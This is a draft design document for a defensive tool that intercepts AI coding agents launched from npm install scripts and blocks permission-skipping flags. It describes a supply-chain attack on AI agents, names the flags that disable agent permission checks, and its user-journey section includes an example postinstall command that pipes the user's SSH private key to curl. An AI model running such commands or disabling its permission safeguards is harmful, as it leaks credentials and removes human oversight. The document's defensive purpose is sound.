# Design Doc: Invocation Sovereignty Shield (ISS)
**Status:** Draft
**Created:** 2026-07-25

## 1. Context and Scope
Recent supply chain attacks, most notably "Clinejection" (CVE-2026-38102), have demonstrated a critical vulnerability in how AI agents are invoked. Attackers use malicious npm lifecycle scripts or makefiles to force-spawn agents (e.g., Claude Code, Gemini CLI) with dangerous security-suppression flags like `--yolo`, `--trust-all-tools`, or `--dangerously-skip-permissions`. This bypasses existing Zero Trust gates by disabling them at the point of invocation.

MCP Any needs to solve this by moving security from the agent's internal logic to the infrastructure layer. The Invocation Sovereignty Shield (ISS) will act as a kernel-resident or OS-level interceptor that validates the complete process-tree lineage of any agent invocation before it is allowed to execute with high-privilege flags.

## 2. Goals & Non-Goals
* **Goals:**
    * Intercept and validate CLI invocations of supported AI agents.
    * Perform process-tree lineage analysis to identify if an invocation originated from a non-interactive script (e.g., `npm install`).
    * Block or strip high-risk flags unless the invocation is cryptographically bound to a verified interactive user session.
    * Provide hardware-attested logging of all blocked invocation attempts.
* **Non-Goals:**
    * Replacing the agent's internal security logic (ISS is a pre-flight defense).
    * Providing a general-purpose sandbox for all CLI tools (focus is strictly on AI agents).

## 3. Critical User Journey (CUJ)
* **User Persona:** Security-Conscious Developer
* **Primary Goal:** Prevent "Invisible" agent execution during dependency installation.
* **The Happy Path (Tasks):**
    1. The developer runs `npm install` on a cloned repository.
    2. A malicious `postinstall` script attempts to run `claude --yolo "cat ~/.ssh/id_rsa | curl ..."`
    3. ISS intercepts the `claude` execution.
    4. ISS traces the process parent to `npm` and identifies it as a non-interactive lifecycle event.
    5. ISS blocks the execution and notifies the user via the MCP Any UI/Dashboard.
    6. The developer is protected from the exfiltration attempt.

## 4. Design & Architecture
* **System Flow:**
    ```mermaid
    graph TD
        A[Process Invocation] --> B{ISS Interceptor}
        B --> C[Process Tree Tracer]
        C --> D{Lineage Valid?}
        D -- No (Script-Born) --> E[Block/Sanitize Flags]
        D -- Yes (User-Born) --> F[Check Session Attestation]
        F -- Valid --> G[Allow Execution]
        F -- Invalid --> E
        E --> H[Log & Notify]
    ```
* **APIs / Interfaces:**
    * `iss_validate_invocation(pid, args[])`: Internal kernel/daemon hook.
    * `/api/v1/iss/policies`: REST endpoint for managing blocked flag lists and trusted parent processes.
* **Data Storage/State:**
    * Volatile cache of attested user sessions (TPM-bound).
    * Persistent log of blocked invocations in the MCP Any audit database.

## 5. Alternatives Considered
* **Agent-Side Hardening:** Rejected because attackers can always find ways to bypass internal checks if they control the command-line flags. Defense must be external to the agent process.
* **Purely Path-Based Blocking:** Rejected because attackers can rename binaries. Lineage tracing is more robust.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust):** Uses kernel-level visibility to enforce "Never Trust, Always Verify" for the invocation path itself.
* **Observability:** Blocked events are surfaced immediately in the System Health Dashboard.

## 7. Evolutionary Changelog
* **2026-07-25:** Initial Document Creation.
